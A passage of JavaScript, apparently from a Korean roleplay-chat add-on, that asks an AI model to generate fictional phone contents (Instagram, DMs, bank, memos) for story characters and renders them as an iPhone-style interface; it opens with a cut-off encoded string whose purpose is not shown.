YHk2IfS0a3FlbCy3aS/qNiL2t1NhMLvwa+oEtr/3o3w5U2D780N3q2K3cbTjfDRTYPhwQ3Zpb7dzeNNTYn451KVvoLbm4JKARQBCUWE2NDGk63eq96EyNlFNjJbVw3epYPd2euKzPlXZVJZwa+I3rzOguLtX02FwvnBrJUS2t/zi9rZTYXA9cG5rNma1oP87UWByPOVjbYQ3qjPhMjZp9qDx+XHhYwS2ujDi9zRgfL2WcaCpN+1/4P90Y7M81KVsIYQ3qvShM3RifDbUpW1ntuSjoby5U2O3/qf7LES2oC1hvPdhsTxQVKVl5Pct66G8uFNiOLmnv+hEtuVpofnzYbE8U+e3orYgr4aSoL02Ynm85/6sdiHit3g+0GH0tVPnuSV2ZyOFoHd5YbD6oT++caTrBwWhu3NgcLpg+/NDd6nnt31w0GB+8iD783Gm4QSRgIAFQKJ+v9SW3besp7azetQQy89KC9Zdt6yntrN61NDLz0oL1vBgKjZqdZPjcrCh93+WcGSsdm8/oTqyUtNhP7qx4qw3qH+T43K5YHyyrua37ym3cvzjfbpgfLqWcGsoN6h2oPryY7yw57jmRLbgq6G8vCH1tFPntum3qW22vD7QYHt9a3Flaau2oKyRE+N+O1NgufhxrikEtru3ovfzIHyxpKEhhBbWBkbAFcLGAMeVw3fpardw9tBh9fhg/nlxp6MEtri96PajuH8mMGtEty6rqjYisr1gOfek52yEN6r0oXZ3Yn071KVqYPagJ+G+PGB4fFPmfu13qia3eHLT2dFTYTb7cG5rN6R6keL1dWG3MpQFxLbt46H5dlNifDXmdWREhsS3NrvjczUr9iZ9rTZk7703YPG7Ynw115ZwZWx3qjPg/zZRYHx+pWxjtubgkqD9uiOwdtSkqaa3bSXqNiL3NWG8eqVn6ocEtvp8ord1a/YnuSV3pav3djnjPXdTYXC4MGvsBLa/+OKy9lNhN7Bwayg2bnuQUGB89mD6MHGlJzZvP5PLz0mhvzWlbCGEN6o4oP90Y7E21KSpprdtJeB38hFAh8ABwkXRkJHU0OE7ulLTYXBxcaehd+j9k+N8N2Gw86VsLIQ3pHNg/ztRYbkx7ua3q2P2v7WjfDRTYTV98eBkB4Whuf5hu7Jg/jdxq2c3qzeT43w3YbDzpWwshDYjtKF0s1FgfjCkqae3KeySoTS2Y7v15nyiRwQdnuG8uFNifDXnvOJ37Oy3c/TQYDwzU+Z7KHZl74YYE9Bhu7UhcXFFxLclqeA3MGH1N2E7OHGl4wS2v/nQYDwzU+e+4HZrr7a99uKxNFNAhMLRldECFgfAw1Db01PnuyF2YKmHoDX0YbW1UZIWcaehN6h7YP86UWB3/+Sp6bclbaB5fVNifDbUpWwitueioHk1IfX4Uee/K3eiYb03YP84Ynm8rDOwaW12ZreT43z9YbM/rua36K/3NjSo9qOx9+Z57US3IK7hvLhTYnvw57eqRLboYdDQUGGwuOD780N3oC/3eD7QYHnwYTs9cGvhNmf3k+KyuuB8sZXJxIQ2Z/+hMvFX02FysnGgYgS2v/ejfDRhvLOWca6tNiDxk+M4tWB+OKSr6oQ36PHg+LsRYHx+pKmlhjZmt6D9uqJ8OtSlbuO25W+ge35TYnN7pnzud6Xst3g+0GH0tVPnsO92Zaf2+7fiubQh93+UAMS27CWhsj9hu/5T57ZsdiAs9za7k9Nic/qmdy12ICyFobr/YbE8U+Z8oHZrY7a/9NBgPD1hcHZARLbnoKG+OaB+OlPntms2bqm2s3viufxTYPvzQ3erYrdxtON8P1Ng9X4waW18IGG2MmGytWtxZWKo9yCn6jYi9nlh9z2u5rZibbd2u+N+vWB6+5ZxrCo3q7ChOrJS02DwM3As5zZkMaD68mI59eZ87kS25W4hvrlgfDRT5/ssRLagqpCgvTNRYHyzpWwthDeo+JPjc3khuXmWcG2gdiEw4P82Y7E21KVurTcr7pDQUGGzPmE2NHGl4wS2vT3QYHw5U+e6p3ZuqYWhuvQh9fEg+/NxpuEEtrNyIvexU2E/vnBhJkS2vnbQYbM+YTY0Q3ZmrUWgN/9RYnN85nThBLcpbCG8tVNiPjzUpWJthwS2vLLjO7lTYXFwca+sNmX9kZNTY/R05jFkd+lrhaG69CH18SD783Gm4QS2+XbiuDxRQkdFUlXQhvdy/NBhuf1hPr9x4GQEtzS14vf6UNPmMGV3q2G3eXrQYDw8U+e3anel67dzMOK2+WA68JZx4qEEtzS74vU6YHI8lnBtq7ZvP6E6slLTYLn2Q3erY4WgcXIhsTwrcWVs5fbgYKA19GGwuFPnuel2bqmFoHG9YbPxYPs3MGvsBLa4cuM4c2G5NZXDdm7lt3P10GB+NWE3sXBr6gS3cP7isfNgfbyWcGQtdmT8q3WgcXxhNjQwa+EEtzY1o3U/YbGxlnBp7gS3frziubBQ2VSWcGvsN+g41VBhuDVgvjBwa+oEtrhz4rb4a/YnueB2ZCX9N2D4vCI9POe7r0S25WogN3tRYnzw5nLod6tht3D20GB89hPmfKF3qy2GkqC9PSJ7vKe5JnZmYYWhunthtX4gufhx4C8HhaB4OlNj93zmfy9EtylsIHl9U2J8NeZ1ZHerYbdw9tBgcX4hNTVDd6luhaB//1Nju/bnu6AGx4S3NvfivP9TYTwzcGlnd6r6k+N+eWB+/KVsIbcpaaG6/1Nju/3nuGF2buWFojv9U2J+9uZ7bnep6IWhvzRhu/5g9X5Bd++itr3943N9U2D58XBua3wgYHF5ID35a3FlZy38oXa4s+NyvSv2J79jdmcjvTdhdndjtvvsM7GvbTZhv+N4ctMQU+e75HZl7rd6PdBgfv9g9HFARLair6G+sBNiOzDmMGdHhDYh9qE//WJ3/dSlbCG25SyqNiKxPGGxdpZwaGA2bz+T4rf4YbJ9ZOUvtyVtkqD/NlFgfLKkoGO27mDgN3tQ0WByNKSor7cr4KB5fVNievjnuyM2Ze+FoHy5YHy6YTv/cGltB4WhtnIhur0hcfVxpWU367/g/ztRYff65WwshDZtMpPjfrJhvDeWceDhB4WgNPdh9nRguflDd6tit3G043w5U2E2+3GmJjZk9ZPiubBTYT50ca5lBwWgN7Vge31hP39Dd60g9zYxorh5YbO7lcN2IGC3fT3QYbn2YPl1MGvsBLd79eM592B8upZwbCc2IferdaH0e2Fwf3Bq7AS2vfbjfvRgcjyk5++HhLa4cuNzflNg+/5wKS5Etr324rL4YHy8lnBoYDekepPjfjvhuXmkqaWHhLa9++M++xNg+fIwa+0Etr/50GB9tVPntiZ3q6eHob36VdFgPf2k5W625W6SoPy3Y7n+1KVpq7bvrZKg/zVjsHTW5KEhhBQVwQEWwMQAQNccw0S2762htn9r9KB1saSvq4YXlkLARJEX02D7PHBr7QS3dj6jPj5TYPvwcaejNmR5k+N6dSH3du7mt6yntrK+orh5YbO7lHBkrTestJPiuHlgdnuVQ3fpava9P+L1e1BT5nTqN+iuhaH+sGG0+1DUpWvntyDskZPjdTRhvzuWca9vNmWzoTG5I/V315ZwYus2IPGg/b9j9/jUpKUvtuUhkqE7uWH7clbVw3Ziaja99tBgfLrg+/9Dd6tit3G043w0YbGxll2bx44FkqF2d2O3tdSlbiDGFFXBgMSr9IeChMLTlryhVULAwQDAQwdsM5AR0NbVUNVQYDwwIPx+A3egbba8NuK5sFFgvTMwKuk2bz+T4rb5YHx3pWJo/KF2s3IjfDlTYL0zMCrpPCBgNfVTYjr2p/gudiAshaG6/+B+NmFwPUBEtqAtobs6E2P1d+Z2LDep6YWhvLVTYnw15nVkd6tqhaA3MGGytGtxZWKo9yCn6jYi9vkh9f6lYuv3K+CSoTy8Y7yw5n7tdiCvhpKg/zRic36sM7Br7zeo++E7ulFgfLGWcGviNma1k+N7viA9u6SobLbk6pDQWtNRYfYylnGgqbeq/JPjfjURQ4CCV4bChLa99tBgfjVhN7Fwa+EEtrhy43N+YbO7lnHi6Teo+5Pivz9TYPnyMGvtBLa7t6L38yv2J7erN6nt/Tdg9bFjsLXnu693rSuFoHI7Yb2zYT53QXYgK7a4veK5/FNgv3JDd6Tjtrow43x4Ybj8pKMrhkcFoby1YbD6YPv+Q3YgLLa6e6N8dmGzu5VDd6lgxaG+ulNiPT7mdCZ3q2yFoDY2U2J8NeZ1ZHZu5ba8NtBhufZg+jQAxLcp7KBw9VNifjenuSZ2bKqFobe5YH/3YPV+Q3epbjd4PuK5sFDZVJZxou02YbqT4rE8YbF2kMN3q6S3NLnQYbM+YTY0ca9tBLc0t+K3t2B8saSsI4Q36PHg+LsRYHx+pKmlh4S3cbbjfrigfL2WcG6mNiEwk+K/PWG5eaVirLbuKJKhdbVRYHV4pKLn922hoHk1IfX4UeZ/JXfuora9/dBgfjVg9X574XagqaGz/SB4c1PVZWlmtqLtk2D/NlFgfH6lbGO25uCSoXW1Y/f7JjKkRLblaiA3e1BRYH49JWxjtubgkqF1tVFgfLKkoGO3K+CSoTjxYj485/8oRLcp75KhNLZifrDUpWJthDesOaD5+GI+PNSk5+xGRw=');
  const phones = async chatId => { try { return JSON.parse(String(await getValue('phone:' + chatId, '{}')) || '{}'); } catch (_) { return {}; } };
  let phoneData = {};
  // 폰·컴퓨터·커뮤 만들기가 실패했을 때, 코드 버그(TypeError)면 어느 줄에서 터졌는지 함께 보여 줍니다.
  //   "Cannot read properties of null" 같은 메시지만으로는 어디가 원인인지 알 수 없어서요.
  const errMsg = e => {
    const m = String(e?.message || e);
    if (!(e instanceof TypeError)) return m;
    const at = String(e.stack || '').split('\n').find(l => /:\d+:\d+/.test(l) && !/errMsg/.test(l)) || '';
    return m + (at ? ` (${at.trim().replace(/^at\s+/, '').slice(-60)})` : '');
  };
  // 답이 잘리거나 쉼표가 어긋나면 배열에 null 항목이 섞입니다. 그대로 그리면 x.title 같은 데서 터져서 미리 걸러요.
  //   칸 자체가 null인 것(insta:null = 인스타를 안 함)은 뜻이 있으니 그대로 둡니다.
  const dropNulls = v => Array.isArray(v) ? v.filter(x => x != null).map(dropNulls)
    : (v && typeof v === 'object') ? Object.fromEntries(Object.entries(v).map(([k, x]) => [k, dropNulls(x)])) : v;
  function parseJsonLoose(text) {
    // JSON이 하나도 없으면 AI가 거절·설명한 말 → 그 말을 그대로 보여 줌
    if (!/[[{]/.test(String(text))) throw new Error('AI가 데이터 대신 이렇게 답했어요: ' + String(text).trim().slice(0, 160));
    const t = String(text).replace(/^```\w*\n?|\n?```$/g, ''), a = t.indexOf('{'), b = t.lastIndexOf('}');
    try { return dropNulls(JSON.parse(a >= 0 && b > a ? t.slice(a, b + 1) : t)); }
    catch (e) { if (a < 0) throw e; try { return dropNulls(repairJson(t.slice(a))); } catch (_) { throw e; } }
  }
  // '새 이야기 반영'에서 답이 잘려 빠진 칸은 기존 것을 그대로 둡니다(칸이 통째로 사라지지 않게).
  const mergeRec = (old, now) => { const o = { ...(old || {}) }; for (const [k, v] of Object.entries(now || {})) if (v != null) o[k] = v; return o; };
  // 중간에 끊긴 JSON: 마지막 온전한 항목까지만 살리고 괄호를 닫아 줍니다.
  function repairJson(t) {
    let s = String(t);
    for (let k = 0; k < 200 && s; k++) {
      const st = []; let inStr = false, esc = false;
      for (const ch of s) {
        if (inStr) { if (esc) esc = false; else if (ch === '\\') esc = true; else if (ch === '"') inStr = false; continue; }
        if (ch === '"') inStr = true; else if (ch === '{' || ch === '[') st.push(ch === '{' ? '}' : ']'); else if ((ch === '}' || ch === ']') && st.length) st.pop();
      }
      try { return JSON.parse(s + (inStr ? '"' : '') + st.reverse().join('')); } catch (_) {}
      const c = s.lastIndexOf(','); if (c < 0) break; s = s.slice(0, c);
    }
    throw new Error('복구 실패');
  }
  // 폰·컴퓨터용 AI 호출: 연결이 끊기면 한 번 더, 답이 길어 잘리면 받은 만큼으로 이어서 씁니다.
  async function askModelRetry(system, input, label) {
    for (let i = 0; ; i++) {
      try { return await askModel(system, input, label); }
      catch (e) {
        if (e?.cut && e.partial) { toast('답이 길어서 받은 만큼만 보여 드려요', 'ok', 3000); return e.partial; }
        if (i < 1 && !/키를|안전 필터|거절|빈 답/.test(String(e?.message))) { toast('한 번 더 시도하는 중이에요…', 'ok', 2500); continue; }
        throw e;
      }
    }
  }
  async function makePhone(name, from = 0, to = 0, update = false) {
    const chatId = chatIdFromPath(); if (!chatId || busyNow || !snapshot) return;
    const upd = update && phoneData[name] ? phoneData[name] : null; if (upd) { from = recUpto(upd) + 1; to = turnEnd(); if (from > to) { toast('지난번 뒤로 새 대화가 없어요.', 'info', 2500); return; } }
    busyNow = true; startGen('phone'); render(); toast(`${josa(name, '이', '가')} 폰을 꾸미는 중이에요… (30초~1분)`);
    try {
      const others = Object.entries(phoneData).filter(([n]) => n !== name).map(([n, r]) => `${n}: 팔로워 ${r.data?.insta?.followers || '-'} · 잔고 ${r.data?.bank?.balance || '-'} · 씀씀이 ${r.data?.bank?.spend || '-'} · 거래처 ${(r.data?.bank?.tx || []).map(t => t.title).slice(0, 6).join('/') || '-'} · 메모 ${(r.data?.memo || []).map(t => t.title).slice(0, 8).join('/') || '-'} · 아이디 ${r.data?.insta?.id || '-'}`).join('\n');
      const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
      const raw = await askModelRetry(withRules(PHONE_PROMPT, etcRoll(true) + phoneRoll()), `[인물] ${name}\n${users.length ? `[유저] ${users.join(', ')} — 이 사람과의 일은 노트에 있던 일만, 이 사람이 보낸 메시지를 지어내지 말 것\n` : '[유저] 노트에 표시 없음 — RP 상대로 보이는 주인공과의 일은 노트에 있던 일만\n'}\n${others ? `[이미 만든 다른 인물의 폰 — 이것과 겹치지 않게, 이 인물답게 다르게]\n${others}\n\n` : ''}${await etcLog(chatId, from, to, '이 장면들에서 이 인물이 겪고 느낀 일을 폰 속(메시지·메모·검색·사진·통화 등)에 특히 많이 반영할 것. 유저가 보낸 말은 지어내지 말 것')}${upd ? updateAsk(upd, '폰') : ''}`, `📱${name}${upd ? ' 갱신' : ''}`);
      let data; try { data = parseJsonLoose(raw); } catch (_) { throw new Error('AI 답을 읽지 못했어요. 한 번 더 눌러 주세요.'); }
      phoneData = await phones(chatId); phoneData[name] = { at: Date.now(), turns: snapshot.note?.turns || 0, from: upd ? upd.from : from, to, upto: to || turnEnd(), data: upd ? mergeRec(upd.data, data) : data };
      await setValue('phone:' + chatId, JSON.stringify(phoneData));
      nav.phScreen = 'home'; toast(`${name}의 폰이 열렸어요 📱`, 'ok', 2500);
    } catch (e) { toast('폰 만들기 실패 · ' + errMsg(e), 'err'); }
    finally { busyNow = false; render(); }
  }
  // 예전에 만든 폰(중고거래가 목록 그대로)도 읽게 맞춥니다.
  const marketOf = d => (Array.isArray(d?.market) ? { items: d.market } : d?.market || { items: [] });
  // 아이폰 앱 아이콘·상태 표시줄 (이모지 대신 직접 그린 그림이라 어느 기기에서나 가운데 정렬)
  const PH_ICON = {
    insta: '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3.5" y="3.5" width="17" height="17" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.2" cy="6.8" r="1" fill="#fff" stroke="none"/></svg>',
    msg: '<svg viewBox="0 0 24 24"><path fill="#fff" d="M12 3.5c5 0 9 3.3 9 7.4s-4 7.4-9 7.4c-.9 0-1.8-.1-2.6-.3L5 20l1.1-3.6C4.2 15.1 3 13.1 3 10.9 3 6.8 7 3.5 12 3.5z"/></svg>',
    album: '<svg viewBox="0 0 24 24">' + [['#FF9500', 0], ['#FFCC00', 45], ['#34C759', 90], ['#5AC8FA', 135], ['#007AFF', 180], ['#AF52DE', 225], ['#FF2D55', 270], ['#FF3B30', 315]].map(([c, r]) => `<ellipse cx="12" cy="7" rx="2.6" ry="4.6" fill="${c}" opacity=".88" transform="rotate(${r} 12 12)"/>`).join('') + '</svg>',
    market: '<svg viewBox="0 0 24 24"><path fill="#fff" d="M12 21.5c-.6 0-1-.5-1.3-1.2L7.6 11.4C7.2 10 8.2 8.8 9.6 8.8h4.8c1.4 0 2.4 1.2 2 2.6l-3.1 8.9c-.3.7-.7 1.2-1.3 1.2z"/><path fill="#fff" d="M11.3 8.2C10.4 6.6 9 5.6 7.4 5.4c.6 1.5 2 2.6 3.6 2.9zM12 7.9c-.2-1.9.4-3.6 1.6-4.6.5 1.6 0 3.4-1.2 4.6zm.8.4c1-1.4 2.5-2.2 4.1-2.1-.8 1.4-2.4 2.3-4 2.3z"/></svg>',
    memo: '<svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="0" fill="#fff"/><rect x="2" y="2" width="20" height="5.5" fill="#FFD60A"/><path stroke="#d1d1d6" stroke-width="1" d="M5 11h14M5 14.5h14M5 18h9"/></svg>',
    bank: '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8"><rect x="3" y="6" width="18" height="12.5" rx="2.5"/><path d="M3 10h18"/><path d="M6.5 15h4" stroke-linecap="round"/></svg>',
  };
  const PH_STATUS = '<span class="ph-sb"><svg viewBox="0 0 18 12" width="17" height="11"><rect x="0" y="8" width="3" height="4" rx=".8"/><rect x="5" y="5.5" width="3" height="6.5" rx=".8"/><rect x="10" y="3" width="3" height="9" rx=".8"/><rect x="15" y="0" width="3" height="12" rx=".8"/></svg>'
    + '<svg viewBox="0 0 16 12" width="15" height="11"><path d="M8 11.5 5.6 9a3.4 3.4 0 0 1 4.8 0z"/><path d="M3.4 6.8a6.5 6.5 0 0 1 9.2 0l-1.2 1.2a4.8 4.8 0 0 0-6.8 0z"/><path d="M1.2 4.6a9.6 9.6 0 0 1 13.6 0l-1.2 1.2a7.9 7.9 0 0 0-11.2 0z"/></svg>'
    + '<svg viewBox="0 0 27 12" width="25" height="12"><rect x=".5" y=".5" width="22" height="11" rx="3.2" fill="none" stroke="currentColor" opacity=".4"/><rect x="2" y="2" width="17" height="8" rx="2"/><path d="M24 4v4a2 2 0 0 0 0-4z" opacity=".4"/></svg></span>';
  // 기본 앱: 데이터가 있을 때만 홈에 나옵니다 (dock: 아래 줄에 둘지)
  const SYS_APPS = [
    { key: 'calls', label: '전화', title: '최근 통화', color: '#34C759', emoji: '📞', dock: true,
      row: x => [x.name || '', `${x.kind || ''}${x.dur ? ' · ' + x.dur : ''}`, x.time || '', /부재중/.test(x.kind || '') ? 'miss' : ''] },
    { key: 'search', label: '사파리', title: '검색 기록', color: '#0A84FF', emoji: '🧭', dock: true,
      row: x => [x.q || '', x.site || '', x.time || ''] },
    { key: 'calendar', label: '캘린더', title: '일정', color: '#FF3B30', emoji: '📅', dock: false,
      row: x => [x.title || '', x.note || '', `${x.date || ''}${x.time ? ' ' + x.time : ''}`] },
    { key: 'music', label: '음악', title: '재생 목록', color: '#FF2D55', emoji: '🎵', dock: false,
      row: x => [x.title || '', x.artist || '', x.note || ''] },
  ];
  const sysBtn = s => `<button class="ph-app" data-act="phgo" data-arg="sys:${s.key}"><i class="ic-x" style="background:${s.color}">${s.emoji}</i><span>${s.label}</span></button>`;
  // 유저가 한 말·보낸 연락은 AI가 지어낸 것이라 화면에서 뺍니다 (이미 만든 폰도 보일 때 걸러요)
  function scrubUser(d0) {
    const users = [...PROF.entries()].filter(([, v]) => v.isUser).map(([n]) => n);
    if (!users.length || !d0) return d0;
    const lc = x => String(x || '').trim().toLowerCase(), keys = new Set();
    users.forEach(u => { [u, canon(u), ...personAlias(u), d0.ids?.[u]].forEach(x => { if (lc(x)) keys.add(lc(x)); }); });
    const isU = x => { const k = lc(x); return !!k && (keys.has(k) || keys.has(lc(canon(x)))); };
    const d = { ...d0 };
    d.dms = (d0.dms || []).filter(m => !isU(m.with) && !isU(m.saved));
    d.messages = (d0.messages || []).filter(m => m.group || (!isU(m.with) && !isU(m.saved)))
      .map(m => m.group ? { ...m, members: (m.members || []).filter(x => !isU(x)), thread: (m.thread || []).filter(x => x.me || !isU(x.from)) } : m);
    d.calls = (d0.calls || []).filter(x => !isU(x.name));
    if (d0.insta) d.insta = { ...d0.insta, posts: (d0.insta.posts || []).map(q => ({ ...q, comments: (q.comments || []).filter(c => !isU(c.from)) })) };
    return d;
  }
  function phClock() {
    const now = new Date(), p2 = n => String(n).padStart(2, '0'), DAY = ['일', '월', '화', '수', '목', '금', '토'];
    let t = `${now.getHours()}:${p2(now.getMinutes())}`, date = `${now.getMonth() + 1}월 ${now.getDate()}일 ${DAY[now.getDay()]}요일`;
    try {
      const sc = blocksOf(bodyOf('현재상태')).filter(b => /시점|장소|기준/.test(b.title || '')).flatMap(b => b.lines).join(' ');
      const tm = sc.match(/(?:^|[^\d])([01]?\d|2[0-3]):([0-5]\d)(?!\d)/), dm = sc.match(/(\d{4})[.\-/]\s?(\d{1,2})[.\-/]\s?(\d{1,2})/);
      if (tm) t = `${Number(tm[1])}:${tm[2]}`;
      if (dm) { const d = new Date(+dm[1], +dm[2] - 1, +dm[3]); if (!isNaN(d)) date = `${d.getMonth() + 1}월 ${d.getDate()}일 ${DAY[d.getDay()]}요일`; }
    } catch (_) {}
    return { t, date };
  }
  function phoneHtml() {
    if (!snapshot?.note && !freshTurns()) return devSeg() + emptyBox('아직 대화가 없어요.');
    const names = etcPeople(), who = names.includes(nav.phWho) ? nav.phWho : names[0];
    if (!who) return devSeg() + `<div class="bd"><div class="bd-empty"><b>이 세계 사람들의 폰</b><small>고른 대화에 나온 인물들을 한 번에 · AI를 1번 불러요 · 기억 노트엔 안 들어가요</small><button class="ph-make" data-act="npcrange">📱 폰 열어 보기</button></div></div>${npcSheet()}`;
    nav.phWho = who;
    const picker = `<div class="tl-who">${names.map(n => `<button data-act="phwho" data-arg="${esc(n)}" aria-pressed="${n === who}">${avatar(n)}<small>${esc(n)}</small>${phoneData[n] ? '' : '<i class="ph-new">새</i>'}</button>`).join('')}${addBtn()}</div>${nameAdder()}`;
    const rec = phoneData[who], d = scrubUser(rec?.data || {}), [bg, fg] = avColor(who), face = PROF.get(who)?.emoji || ANIM.get(who) || animalOf(who);
    // 아이디 ↔ 인물: 노트 인물의 아이디면 그 인물 얼굴, 아니면 회색 머리글자
    const idOf = d.ids || {}, byId = new Map(Object.entries(idOf).map(([n, id]) => [String(id), canon(n)]));
    const faceOf = idOrName => { const n = byId.get(String(idOrName)) || (people().has(canon(idOrName)) ? canon(idOrName) : '');
      return n ? avatar(n) : `<span class="av ph-anon">${esc([...String(idOrName || '?')][0].toUpperCase())}</span>`; };
    const idFor = n => idOf[n] || n;
    const clk = phClock(), bar = `<div class="ph-status"><b>${clk.t}</b>${PH_STATUS}</div>`;
    const screen = (body, title = '', right = '', back = false) => `${bar}${title || right || back ? `<div class="ph-nav"><button data-act="phback">‹</button><b>${title}</b>${right || '<span></span>'}</div>` : ''}<div class="ph-body">${body}</div>`;
    const pic = (item, path, big) => item?.img && /^(?:data:image\/|https:\/\/)/i.test(item.img) ? `<img class="ph-img" src="${esc(item.img)}" alt="${esc(item.photo || '')}">`
      : `<span class="ph-fake">${esc(item?.emoji || '📷')}${big ? `<small>${esc(item?.photo || '')}</small>` : ''}</span>`;
    const bubbles = (th, cls) => { const lastMe = th.map(x => !!x.me).lastIndexOf(true);
      return th.map((x, i, a) => { const gap = i > 0 && x.time && a[i - 1].time && x.time !== a[i - 1].time && i % 6 === 0, tail = i === a.length - 1 || !!a[i + 1].me !== !!x.me;
        const emo = /^(?:\p{Extended_Pictographic}|\p{Emoji_Modifier}|\uFE0F|\u200D|\s){1,16}$/u.test(String(x.text || '').trim()) && /\p{Extended_Pictographic}/u.test(x.text || '');
        const from = !x.me && x.from && (i === 0 || a[i - 1].me || a[i - 1].from !== x.from) ? `<p class="im-from">${esc(x.from)}</p>` : '';
        return `${gap ? `<p class="im-time">${esc(x.time)}</p>` : ''}${from}<p class="${cls} ${x.me ? 'me' : 'them'}${tail ? ' tail' : ''}${emo ? ' emo' : ''}">${esc(x.text)}</p>${i === lastMe && i === a.length - 1 ? `<p class="im-read">${cls === 'dm-b' ? '읽음' : '읽음'}</p>` : ''}`; }).join(''); };
    let inner;
    if (!rec) inner = `${bar}<div class="ph-lock" style="--wb:${bg};--wf:${fg}"><span class="ph-clock">${clk.t}</span><span class="ph-date">${esc(clk.date)}</span><span class="ph-date" style="font-size:13px;font-weight:500">${esc(who)}의 폰</span>
        <button class="ph-make" data-act="phmake" data-arg="${esc(who)}"${busyNow ? ' disabled' : ''}>${busyNow ? '꾸미는 중…' : '📱 폰 열어 보기'}</button>
        <small>AI를 1번 불러요 · 노트에 맞춰 성격대로 · 기억 노트엔 안 들어가요</small></div>`;
    else {
      const sc = nav.phScreen || 'home', ins = d.insta || {}, posts = ins.posts || [], dms = d.dms || [], msgs = d.messages || [], mk = marketOf(d), items = mk.items || [], memo = d.memo || [], album = d.album || [], bank = d.bank || null, secret = d.secret || [];
      const [scr, arg] = sc.split(':'), at = Number(arg);
      if (scr === 'home') {
        const app = (key, label, cls, emo, n) => `<button class="ph-app" data-act="phapp" data-arg="${key}"><i class="${cls}">${PH_ICON[key] || emo}</i><span>${label}</span>${n ? `<em>${n}</em>` : ''}</button>`;
        const unread = msgs.filter(m => !(m.thread || []).slice(-1)[0]?.me).length, dmUnread = dms.filter(m => !(m.thread || []).slice(-1)[0]?.me).length;
        inner = `${bar}<div class="ph-home" style="--wb:${bg};--wf:${fg}"><div class="ph-widget"><span>${face}</span><b>${esc(who)}</b><small>${rec.turns}턴 시점</small></div>
          <div class="ph-grid">${d.insta ? app('insta', '인스타', 'ic-insta', '📷', dmUnread) : ''}${d.market ? app('market', '당근', 'ic-market', '🥕', items.reduce((a, x) => a + (Number(x.chats) || 0), 0) || '') : ''}${memo.length || secret.length ? app('memo', '메모', 'ic-memo', '📝', '') : ''}${bank ? `<button class="ph-app" data-act="phapp" data-arg="bank"><i class="ic-bank" style="background:linear-gradient(${fg},${fg}cc)">${PH_ICON.bank}</i><span>${esc(String(bank.bank || '은행').slice(0, 5))}</span></button>` : ''}${SYS_APPS.filter(s => s.dock === false && (d[s.key] || []).length).map(s => sysBtn(s)).join('')}${(d.apps || []).map((x, i) => `<button class="ph-app" data-act="phgo" data-arg="xapp:${i}"><i class="ic-x" style="background:${esc(x.color || '#5856D6')}">${esc(x.emoji || '📱')}</i><span>${esc(String(x.name || '').slice(0, 6))}</span></button>`).join('')}</div>
          ${SYS_APPS.some(s => s.dock && (d[s.key] || []).length) || msgs.length || album.length ? `<div class="ph-dock">${SYS_APPS.filter(s => s.dock && (d[s.key] || []).length).map(s => sysBtn(s)).join('')}${msgs.length ? app('msg', '메시지', 'ic-msg', '💬', unread) : ''}${album.length ? app('album', '사진', 'ic-photos', '🌼', '') : ''}</div>` : ''}</div>`;
      } else if (scr === 'insta') {
        inner = screen(`<div class="ig-top"><span class="ig-av" style="background:${bg}">${face}</span><div class="ig-nums"><p><b>${posts.length}</b>게시물</p><p><b>${esc(ins.followers || '0')}</b>팔로워</p><p><b>${esc(ins.following || '0')}</b>팔로잉</p></div></div>
          <p class="ig-name">${esc(ins.name || who)}</p><p class="ig-bio">${esc(ins.bio || '')}</p>
          <div class="ig-btns"><span>프로필 편집</span><span>프로필 공유</span></div>
          ${(ins.highlights || []).length ? `<div class="ig-hl">${ins.highlights.map(h => `<span><i>${esc(h.emoji || '✨')}</i><small>${esc(h.title || '')}</small></span>`).join('')}</div>` : ''}
          <div class="ig-tabs"><b>▦</b><span>▶</span><span>👤</span></div>
          <div class="ig-grid">${posts.map((p, i) => `<button data-act="phgo" data-arg="post:${i}" style="--pb:${AV[i % AV.length][0]}">${pic(p, 'post:' + i, false)}</button>`).join('')}</div>`,
          esc(ins.id || who), `<button class="ph-navr" data-act="phgo" data-arg="dm">✈${dms.length ? `<em>${dms.length}</em>` : ''}</button>`);
      } else if (scr === 'post') {
        const p = posts[at] || {}, likes = Number(p.likes) || 0, cms = p.comments || [];
        inner = screen(`<div class="ig-post"><div class="ig-ph"><span class="ig-av sm" style="background:${bg}">${face}</span><span><b>${esc(ins.id || who)}</b>${p.place ? `<small>${esc(p.place)}</small>` : ''}</span><i>···</i></div>
          <div class="ig-photo" style="--pb:${bg}">${pic(p, 'post:' + at, true)}</div>
          <p class="ig-acts"><span>♡ 💬 ➤</span><span>🔖</span></p>
          <p class="ig-likes">${p.liked_by ? `<b>${esc(p.liked_by)}</b>님 외 <b>${fmt(Math.max(0, likes - 1))}명</b>이 좋아합니다` : `좋아요 ${fmt(likes)}개`}</p>
          <p class="ig-cap"><b>${esc(ins.id || who)}</b> ${esc(p.caption || '')}</p><p class="ig-date">${esc(p.ago || p.date || '')}</p>
          <div class="ig-cms"><p class="ig-cmh">댓글</p>${cms.map(c => `<div class="ig-cmrow${c.reply ? ' re' : ''}">${faceOf(c.from)}<div><p><b>${esc(c.from)}</b> <span>${esc(c.ago || '')}</span></p><p>${esc(c.text)}</p><small>${c.likes ? `좋아요 ${esc(String(c.likes))}개 · ` : ''}답글 달기</small></div><i>♡</i></div>`).join('')}</div>
          <div class="ig-add">${avatar(who)}<span>${esc(ins.id || who)}(으)로 댓글 달기...</span></div></div>`, '게시물');
      } else if (scr === 'dm') {
        inner = screen(`<div class="dm-tabs"><b>메시지</b><span>요청</span></div><div class="im-list">${dms.map((m, i) => { const last = (m.thread || []).slice(-1)[0] || {}, unread = !last.me;
            return `<button data-act="phgo" data-arg="dmt:${i}">${faceOf(idFor(m.with))}<span><b>${esc(m.with)}</b><small${unread ? ' class="ur"' : ''}>${esc(last.me ? '회원님: ' + (last.text || '') : last.text || '')} · ${esc(last.time || '')}</small></span>${unread ? '<i class="dot"></i>' : '<em>📷</em>'}</button>`; }).join('') || '<p class="ph-empty">DM이 없어요</p>'}</div>`,
          esc(ins.id || who));
      } else if (scr === 'dmt') {
        const m = dms[at] || {}, th = m.thread || [];
        inner = `${bar}<div class="im-head dm"><button data-act="phback">‹</button><span class="im-hav row">${faceOf(idFor(m.with))}<span><b>${esc(m.with || '')}</b><small>${esc(m.active || '활동 중')}</small></span></span><span>📞</span></div>
